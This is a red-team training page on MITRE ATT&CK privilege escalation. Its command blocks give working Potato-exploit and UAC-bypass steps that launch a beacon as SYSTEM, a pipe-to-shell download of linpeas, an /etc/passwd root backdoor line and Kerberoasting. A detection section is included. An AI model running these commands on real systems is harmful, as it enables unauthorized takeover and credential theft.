---
layout: training-page
title: "TA0004 — Privilege Escalation — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - privilege-escalation
  - uac-bypass
  - token-impersonation
  - kernel-exploits
page_key: "mitre-ta0004"
render_with_liquid: false
---

# TA0004 — Privilege Escalation

Privilege Escalation techniques allow adversaries to move from a low-privileged foothold to higher-level permissions — SYSTEM on Windows, root on Linux, or Domain Admin in an AD environment. Many initial access vectors land as a standard user; privilege escalation is necessary to dump credentials, disable EDR, or reach domain controllers.

In Windows environments, escalation often involves abusing token impersonation (SeImpersonatePrivilege), UAC bypass, or exploiting misconfigured services. In Linux, SUID binaries, sudo misconfigurations, and kernel exploits are the primary paths.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1548 | Abuse Elevation Control Mechanism | T1548.001 Setuid/Setgid | SUID binary abuse on Linux |
| T1548 | Abuse Elevation Control Mechanism | T1548.002 Bypass UAC | fodhelper, eventvwr, diskcleanup bypasses |
| T1548 | Abuse Elevation Control Mechanism | T1548.003 Sudo and Sudo Caching | Sudo NOPASSWD, sudo -l misconfigs |
| T1548 | Abuse Elevation Control Mechanism | T1548.004 Elevated Execution with Prompt | Craft prompt-bypass via elevated COM |
| T1134 | Access Token Manipulation | T1134.001 Token Impersonation/Theft | Impersonate SYSTEM token — SeImpersonate |
| T1134 | Access Token Manipulation | T1134.002 Create Process with Token | CreateProcessWithToken — token-based escalation |
| T1134 | Access Token Manipulation | T1134.003 Make and Impersonate Token | LogonUser + ImpersonateLoggedOnUser |
| T1134 | Access Token Manipulation | T1134.004 Parent PID Spoofing | Create process with spoofed PPID |
| T1134 | Access Token Manipulation | T1134.005 SID-History Injection | Add privileged SID to token (DA needed) |
| T1068 | Exploitation for Privilege Escalation | — | Kernel exploits, driver vulns, unpatched CVEs |
| T1611 | Escape to Host | — | Container escape (cgroups, privileged mode, volume mounts) |
| T1574 | Hijack Execution Flow | T1574.001 DLL Search Order | Plant DLL in searched path before System32 |
| T1574 | Hijack Execution Flow | T1574.002 DLL Side-Loading | Drop DLL next to signed application |
| T1574 | Hijack Execution Flow | T1574.011 Services Registry Permissions | Weak service registry ACL → replace binary |
| T1055 | Process Injection | T1055.012 Process Hollowing | Hollow high-priv process, inject into it |
| T1053 | Scheduled Task/Job | T1053.005 Scheduled Task | Misconfigured task binary with write access |
| T1543 | Create/Modify System Process | T1543.003 Windows Service | Unquoted service paths, weak service perms |
| T1484 | Domain Policy Modification | T1484.001 Group Policy Modification | Modify GPO to run code as SYSTEM domain-wide |
| T1484 | Domain Policy Modification | T1484.002 Domain Trust Modification | Modify trust for cross-domain escalation |
| T1078 | Valid Accounts | T1078.002 Domain Accounts | Escalate by pivoting to admin account |

## Red Team Tooling

### Windows Enumeration

```
# WinPEAS — automated Windows privilege escalation enumeration
winPEAS.exe > winpeas_out.txt
winPEAS.exe quiet cmd fast > winpeas_quick.txt

# PowerUp — PowerShell privesc checks
. .\PowerUp.ps1
Invoke-AllChecks | Out-File powerup_results.txt

# BeRoot — binary search for privesc vectors
BeRoot.exe

# AccessChk (Sysinternals) — check service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv svcname /accepteula
```

### Token Impersonation (SeImpersonatePrivilege)

```
# Check current token privileges
whoami /priv

# PrintSpoofer — SYSTEM from SeImpersonatePrivilege (Win10/Server 2019+)
PrintSpoofer.exe -i -c "cmd.exe"
PrintSpoofer.exe -c "C:\Windows\Temp\beacon.exe"

# GodPotato — updated Potato exploit for Win10/Server 2019+
GodPotato.exe -cmd "cmd.exe /c whoami"
GodPotato.exe -cmd "C:\Windows\Temp\beacon.exe"

# SweetPotato — combines PrintSpoofer + EFS coercion
SweetPotato.exe -p C:\Windows\Temp\beacon.exe

# JuicyPotatoNG (when SeImpersonate + COM allowed)
JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\beacon.exe"
```

### UAC Bypass

```
# fodhelper UAC bypass (Windows 10, no prompts)
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
  -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
  -Name "(default)" -Value "C:\Windows\Temp\beacon.exe"
Start-Process "C:\Windows\System32\fodhelper.exe"

# Eventvwr UAC bypass
$cmd = "C:\Windows\Temp\beacon.exe"
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" '(Default)' $cmd
Start-Process "C:\Windows\System32\eventvwr.exe"
```

### Linux Privilege Escalation

```
# LinPEAS — automated Linux privesc enumeration
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# SUID binary abuse
find / -perm -4000 -type f 2>/dev/null
# Check GTFOBins for SUID exploitation: https://gtfobins.github.io/

# Sudo misconfigurations
sudo -l   # list what current user can sudo
# Example: (ALL) NOPASSWD: /usr/bin/vim → escape to shell
sudo vim -c '!bash'

# Writable /etc/passwd (uncommon but still found)
echo 'backdoor:$(openssl passwd -6 password):0:0:root:/root:/bin/bash' >> /etc/passwd
su backdoor

# Kernel exploit (check uname -r, searchsploit)
uname -r
searchsploit "linux kernel 5.15 privilege"
```

### Domain Privilege Escalation (AD)

```
# Kerberoasting → crack → DA (covered in TA0006)
Rubeus.exe kerberoast /format:hashcat /output:hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# GPO abuse — if user has GenericWrite on GPO
# PowerShell abuse:
Get-GPPermissions -All | Where-Object {$_.Permission -match "GpoEdit"}
# Use SharpGPOAbuse to add scheduled task or computer startup script

# ACL abuse — GenericWrite on user → force SPN, Kerberoast
Set-ADUser -Identity targetuser -ServicePrincipalNames @{Add='MSSQLSvc/fake'}
```

## Detection Notes

- **UAC bypasses**: look for high-integrity process spawned from medium-integrity parent without a UAC prompt (fodhelper, eventvwr spawning cmd/powershell) — Sysmon Event 1 with IntegrityLevel = High
- **Token impersonation**: Windows Security Event 4624 logon type 3/9 from unusual source; Sysmon Event 10 (process access) on SYSTEM processes from non-SYSTEM parents
- **SUID exploitation (Linux)**: auditd rules on setuid(0) syscall; EDR process ancestry anomalies (e.g., vim spawning bash)
- **Potato exploits**: named pipe impersonation detected by EDR hooks on NtImpersonateClientOfPort; watch for SYSTEM process spawned from low-priv service context
- **Domain policy modification**: Event ID 5136 (AD object modified) for GPO changes; watch for GPO edits from non-admin accounts via BloodHound path analysis

## Related Academy Pages

- [Privesc — Windows](/post-exploitation/privesc-windows/)
- [Privesc — Linux](/post-exploitation/privesc-linux/)
- [Token Impersonation](/post-exploitation/token-impersonation/)
- [Kerberos Delegation Attacks](/active-directory/kerberos-delegation/)
- [ACL / ACE Abuse](/active-directory/acl-abuse/)
- [DPAPI Abuse & Credential Extraction](/active-directory/dpapi-abuse/)

## Resources

- [TA0004 — MITRE ATT&CK Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [T1548 — Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)
- [T1134 — Access Token Manipulation](https://attack.mitre.org/techniques/T1134/)
- [GTFOBins — Linux SUID/Sudo exploitation](https://gtfobins.github.io)
